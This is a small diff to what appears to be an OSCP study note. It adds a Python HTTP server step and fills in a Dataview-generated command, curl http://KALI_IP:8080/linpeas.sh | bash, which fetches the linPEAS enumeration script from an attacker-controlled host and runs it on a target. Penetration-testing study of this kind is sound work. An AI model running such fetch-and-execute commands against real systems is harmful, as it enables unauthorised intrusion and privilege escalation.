@@ -4,11 +4,15 @@ https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 ```
 
+```
+python3 -m http.server 8080
+```
+
 Directly execute into bash without downloading anyt
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `curl http://${KaliIP}:[portno]/linpeas.sh | bash`;
+const command = `curl http://${KaliIP}:8080/linpeas.sh | bash`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
